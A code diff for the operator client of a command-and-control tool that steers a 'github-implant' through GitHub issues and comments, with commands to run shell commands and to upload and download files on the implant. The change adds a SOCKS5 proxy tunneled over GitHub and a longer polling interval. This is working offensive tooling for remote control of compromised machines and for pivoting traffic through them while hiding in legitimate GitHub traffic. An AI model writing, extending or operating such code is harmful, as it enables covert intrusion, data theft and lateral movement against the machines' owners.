@@ -3,6 +3,7 @@ package main
 import (
 	"bufio"
 	"bytes"
+	"darknight/github/socks5"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
@@ -43,6 +44,7 @@ func GetOldestIssueNumber(token, owner, repo string) (int, error) {
 		return 0, fmt.Errorf("failed to read response body: %v", err)
 	}
 
+	//fmt.Println(string(body))
 	// 解析返回的 issue 列表
 	var issues []Issue
 	if err := json.Unmarshal(body, &issues); err != nil {
@@ -264,6 +266,7 @@ func printHelp() {
 	fmt.Println(" - cmd <command> : execute command")
 	fmt.Println(" - upload <local_file_path> <remote_file_name> : upload local file to the github-implant")
 	fmt.Println(" - download <implant_file_path> <remote_file_name> : download file of github-implant to current local path")
+	fmt.Println(" - socks5 start/stop : turn on or off a SOCKS5 service")
 	fmt.Println(" - exit : kill the connection with the github-implant")
 }
 
@@ -302,7 +305,7 @@ func main() {
 				continue
 			}
 
-			time.Sleep(5 * time.Second)
+			time.Sleep(8 * time.Second)
 
 			issueNbrStr := fmt.Sprintf("%d", issueNbr)
 			comment, err := GetComment(token, owner, repo, issueNbrStr)
@@ -417,6 +420,28 @@ func main() {
 				fmt.Println("file download fail, please try again")
 			}
 			issueNbr++
+		} else if strings.HasPrefix(task, "socks5") {
+			if task == "socks5 start" {
+				fmt.Printf("task: %s\n", task)
+				if err := PostIssue(token, owner, repo, task); err != nil {
+					fmt.Println(Error("Failed to post issue", err))
+				}
+				//启动socks5服务端
+				socks5Client := socks5.NewGithubSocks5(owner, repo, token, "127.0.0.1:12344")
+				go socks5Client.StartServer()
+				time.Sleep(1 * time.Second)
+				continue
+			} else if task == "socks5 stop" {
+				fmt.Printf("task: %s\n", task)
+				if err := PostIssue(token, owner, repo, task); err != nil {
+					fmt.Println(Error("Failed to post issue", err))
+				}
+				time.Sleep(1 * time.Second)
+				continue
+			} else {
+				printHelp()
+			}
+
 		} else {
 			printHelp()
 		}
